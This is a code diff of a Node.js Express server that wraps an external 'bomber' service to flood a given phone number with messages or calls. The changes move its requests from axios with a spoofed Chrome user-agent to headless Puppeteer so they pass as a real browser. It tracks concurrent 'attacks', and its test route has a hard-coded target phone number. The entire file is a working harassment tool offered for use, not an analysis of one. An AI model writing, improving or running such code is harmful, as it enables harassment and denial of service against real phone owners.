@@ -1,10 +1,9 @@
 // ============================================================
-// bomber_server.js - Vishal Bomber Wrapper Server
-// Max 3min cap | Max 2 concurrent attacks | Logs
+// bomber_server.js - Vishal Bomber (Real Chrome via Puppeteer)
 // ============================================================
 
 const express = require('express');
-const axios = require('axios');
+const puppeteer = require('puppeteer');  // 🔥 REAL BROWSER
 const cors = require('cors');
 
 const app = express();
@@ -16,16 +15,17 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // 🔥 CONFIGURATION
 // ============================================================
 
-const MAX_DURATION_MIN = 3;          // 3min highest cap
-const MAX_CONCURRENT_ATTACKS = 2;    // Ek time pe max 2 attacks
+const MAX_DURATION_MIN = 3;
+const MAX_CONCURRENT_ATTACKS = 2;
 const VISHAL_BOMBER_URL = 'https://vishal.lovestoblog.com/bomber4.php';
 
 // ============================================================
-// 🔄 ACTIVE ATTACKS TRACKER
+// 🔄 ACTIVE ATTACKS
 // ============================================================
 
-const activeAttacks = new Map();     // phone → { startTime, duration, attackId }
+const activeAttacks = new Map();
 let attackCounter = 0;
+let browser = null;  // 🔥 Global browser instance
 
 // ============================================================
 // 📊 LOGGER
@@ -44,7 +44,30 @@ function log(level, msg) {
 }
 
 // ============================================================
-// 🎯 VISHAL BOMBER CALL FUNCTION
+// 🌐 BROWSER LAUNCH
+// ============================================================
+
+async function getBrowser() {
+    if (!browser) {
+        log('info', '🌐 Launching headless Chrome...');
+        browser = await puppeteer.launch({
+            headless: 'new',  // New headless mode (Chrome jaisa)
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-gpu',
+                '--single-process',
+                '--no-zygote'
+            ]
+        });
+        log('success', '✅ Headless Chrome launched');
+    }
+    return browser;
+}
+
+// ============================================================
+// 🎯 VISHAL BOMBER CALL — REAL CHROME
 // ============================================================
 
 async function callVishalBomber(phone, duration, attackId) {
@@ -53,27 +76,36 @@ async function callVishalBomber(phone, duration, attackId) {
     log('info', `🚀 ATTACK #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);
     log('info', `🔗 URL: ${url}`);
 
+    let page = null;
+
     try {
-        // 🔥 Chrome ki tarah request bhejo (User-Agent + Headers)
-        const response = await axios.get(url, {
-            timeout: 30000,  // 30s timeout
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1'
-            },
-            validateStatus: () => true  // Sab status accept karo
+        const b = await getBrowser();
+        page = await b.newPage();
+
+        // 🔥 Chrome jaisa user-agent set karo
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36');
+
+        // 🔥 Real Chrome ki tarah URL kholo
+        log('info', `🌐 Opening URL in real Chrome...`);
+        
+        const response = await page.goto(url, {
+            waitUntil: 'networkidle2',  // Network idle hone tak wait karo
+            timeout: 60000  // 60s timeout
         });
 
-        const responseTime = Date.now();
-        log('success', `✅ ATTACK #${attackId} RESPONSE | Status: ${response.status} | Phone: ${phone}`);
-        
+        const status = response ? response.status() : 'NO_RESPONSE';
+        log('success', `✅ ATTACK #${attackId} RESPONSE | Status: ${status} | Phone: ${phone}`);
+
+        // 🔥 Page ka content check karo
+        const bodyText = await page.evaluate(() => document.body.innerText);
+        log('info', `📄 Page content: ${bodyText.substring(0, 200)}`);
+
+        // 🔥 Thoda wait karo (Vishal Bomber ko time do)
+        await new Promise(r => setTimeout(r, 5000));
+
         return {
             success: true,
-            status: response.status,
+            status: status,
             attackId,
             phone,
             duration
@@ -88,43 +120,34 @@ async function callVishalBomber(phone, duration, attackId) {
             duration,
             error: err.message
         };
+    } finally {
+        if (page) {
+            await page.close().catch(() => {});
+        }
     }
 }
 
 // ============================================================
-// 🎯 BOMBING SESSION — Vishal Bomber Ko Call Karega
+// 🎯 BOMBING SESSION
 // ============================================================
 
 async function runAttackSession(phone, duration, attackId) {
     const startTime = Date.now();
-    const endTime = startTime + (duration * 60 * 1000);  // duration minutes me
+    
+    log('info', `⚔️  SESSION #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);
 
-    log('info', `⚔️  SESSION #${attackId} START | Phone: ${phone} | Duration: ${duration}min | End: ${new Date(endTime).toLocaleTimeString()}`);
+    const result = await callVishalBomber(phone, duration, attackId);
 
-    let cycleCount = 0;
-
-    // 🔥 Jab tak time khatam na ho, Vishal Bomber ko call karte raho
-    while (Date.now() < endTime && activeAttacks.has(phone)) {
-        cycleCount++;
-        
-        log('info', `🔄 SESSION #${attackId} | Cycle #${cycleCount} | Phone: ${phone}`);
-        
-        // 🔥 Vishal Bomber ko call karo
-        const result = await callVishalBomber(phone, duration, attackId);
-        
-        // 🔥 Agar attack successful hai toh 30 second wait karo
-        if (result.success) {
-            await new Promise(r => setTimeout(r, 30000));  // 30 sec delay
-        } else {
-            await new Promise(r => setTimeout(r, 10000));  // 10 sec delay on fail
-        }
+    if (result.success) {
+        log('success', `✅ SESSION #${attackId} COMPLETE`);
+    } else {
+        log('fail', `❌ SESSION #${attackId} FAILED`);
     }
 
-    // 🔥 Session complete
-    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
     activeAttacks.delete(phone);
     
-    log('success', `✅ SESSION #${attackId} END | Phone: ${phone} | Cycles: ${cycleCount} | Time: ${elapsed}s`);
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+    log('info', `🏁 SESSION #${attackId} END | Time: ${elapsed}s`);
 }
 
 // ============================================================
@@ -134,69 +157,66 @@ async function runAttackSession(phone, duration, attackId) {
 app.get('/', (req, res) => {
     res.json({
         status: 'ok',
-        server: 'Vishal Bomber Wrapper',
+        server: 'Vishal Bomber (Real Chrome)',
         max_duration_min: MAX_DURATION_MIN,
-        max_concurrent_attacks: MAX_CONCURRENT_ATTACKS,
+        max_concurrent: MAX_CONCURRENT_ATTACKS,
         active_attacks: activeAttacks.size,
-        active_phones: Array.from(activeAttacks.keys()),
-        vishal_url: VISHAL_BOMBER_URL,
-        uptime: process.uptime()
+        vishal_url: VISHAL_BOMBER_URL
     });
 });
 
-// 🔥 HEALTH ROUTE
 app.get('/health', (req, res) => {
     res.json({
         ready: true,
         active_attacks: activeAttacks.size,
-        max_concurrent: MAX_CONCURRENT_ATTACKS,
         can_accept: activeAttacks.size < MAX_CONCURRENT_ATTACKS
     });
 });
 
-// 🔥 BOMB ROUTE — Bot.js yahan request bhejega
+// 🔥 TEST ROUTE
+app.get('/test-vishal', async (req, res) => {
+    const phone = req.query.phone || '7777885694';
+    const duration = req.query.duration || 1;
+    
+    log('info', `🧪 MANUAL TEST | Phone: ${phone} | Duration: ${duration}`);
+    
+    const result = await callVishalBomber(phone, duration, 'TEST');
+    
+    res.json({
+        url: `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`,
+        result: result
+    });
+});
+
 app.post('/bomb', async (req, res) => {
     const { phone, duration, instance } = req.body;
 
-    // 🔥 Validation
     if (!phone || phone.length !== 10) {
-        log('fail', `❌ Invalid phone number: ${phone}`);
-        return res.status(400).json({ 
-            success: false, 
-            error: 'Invalid phone number. Must be 10 digits.' 
-        });
+        return res.status(400).json({ success: false, error: 'Invalid phone' });
     }
 
-    // 🔥 3min HIGHEST CAP
     const requestedDuration = Number(duration) || 1;
     const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
 
-    log('info', `📱 NEW REQUEST | Phone: ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
+    log('info', `📱 NEW REQUEST | Phone: ${phone} | Duration: ${effectiveDuration}min`);
 
-    // 🔥 CHECK — Agar same phone pe already attack chal raha hai
     if (activeAttacks.has(phone)) {
-        log('warn', `⚠️  Phone ${phone} pe already attack chal raha hai. Skip.`);
         return res.json({
             success: false,
             phone,
-            message: 'Attack already running on this phone',
-            active_attacks: activeAttacks.size
+            message: 'Attack already running'
         });
     }
 
-    // 🔥 CHECK — Max 2 concurrent attacks
     if (activeAttacks.size >= MAX_CONCURRENT_ATTACKS) {
-        log('warn', `⚠️  Max concurrent attacks (${MAX_CONCURRENT_ATTACKS}) reached. Queue full.`);
         return res.status(429).json({
             success: false,
             phone,
-            message: `Server busy. Max ${MAX_CONCURRENT_ATTACKS} attacks allowed. Try again in ${effectiveDuration} min.`,
-            active_attacks: activeAttacks.size,
+            message: `Max ${MAX_CONCURRENT_ATTACKS} attacks allowed`,
             retry_after: 60
         });
     }
 
-    // 🔥 NEW ATTACK START
     attackCounter++;
     const attackId = `A${attackCounter}_${phone}`;
 
@@ -204,68 +224,36 @@ app.post('/bomb', async (req, res) => {
         attackId,
         phone,
         duration: effectiveDuration,
-        startTime: Date.now(),
-        instance: instance || 'default'
+        startTime: Date.now()
     });
 
-    log('success', `✅ ATTACK #${attackId} STARTED | Phone: ${phone} | Duration: ${effectiveDuration}min | Active: ${activeAttacks.size}/${MAX_CONCURRENT_ATTACKS}`);
+    log('success', `✅ ATTACK #${attackId} STARTED`);
 
-    // 🔥 Background me attack chalao
     runAttackSession(phone, effectiveDuration, attackId).catch(err => {
-        log('error', `❌ SESSION #${attackId} ERROR: ${err.message}`);
+        log('error', `❌ ERROR: ${err.message}`);
         activeAttacks.delete(phone);
     });
 
-    // 🔥 Turant response
     res.json({
         success: true,
         attack_id: attackId,
         phone,
-        requested_duration: requestedDuration,
         effective_duration: effectiveDuration,
-        active_attacks: activeAttacks.size,
-        max_concurrent: MAX_CONCURRENT_ATTACKS,
-        message: `Attack started for ${effectiveDuration} min`
+        active_attacks: activeAttacks.size
     });
 });
 
-// 🔥 ATTACK STATUS ROUTE
 app.get('/attacks', (req, res) => {
     res.json({
         active_attacks: activeAttacks.size,
-        max_concurrent: MAX_CONCURRENT_ATTACKS,
-        attacks: Array.from(activeAttacks.values()).map(a => ({
-            attackId: a.attackId,
-            phone: a.phone,
-            duration: a.duration,
-            elapsed: ((Date.now() - a.startTime) / 1000).toFixed(1) + 's',
-            instance: a.instance
-        }))
+        attacks: Array.from(activeAttacks.values())
     });
 });
 
-// 🔥 STOP ATTACK ROUTE
-app.post('/stop/:phone', (req, res) => {
-    const { phone } = req.params;
-    if (activeAttacks.has(phone)) {
-        activeAttacks.delete(phone);
-        log('warn', `🛑 ATTACK STOPPED | Phone: ${phone}`);
-        res.json({ success: true, message: 'Attack stopped', phone });
-    } else {
-        res.json({ success: false, message: 'No active attack on this phone', phone });
-    }
-});
-
-// ============================================================
-// 🚀 START SERVER
-// ============================================================
-
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    log('success', `🚀 Vishal Bomber Wrapper Server running on port ${PORT}`);
-    log('info', `📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    log('info', `⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
-    log('info', `🔒 Max concurrent attacks: ${MAX_CONCURRENT_ATTACKS}`);
-    log('info', `🔗 Vishal Bomber URL: ${VISHAL_BOMBER_URL}`);
-    log('info', `📍 Routes: /bomb (POST), /attacks (GET), /stop/:phone (POST)`);
+    log('success', `🚀 Server running on port ${PORT}`);
+    log('info', `🔗 Vishal URL: ${VISHAL_BOMBER_URL}`);
+    log('info', `🌐 Mode: REAL CHROME (Puppeteer)`);
+    log('info', `🧪 Test: /test-vishal?phone=7777885694&duration=1`);
 });
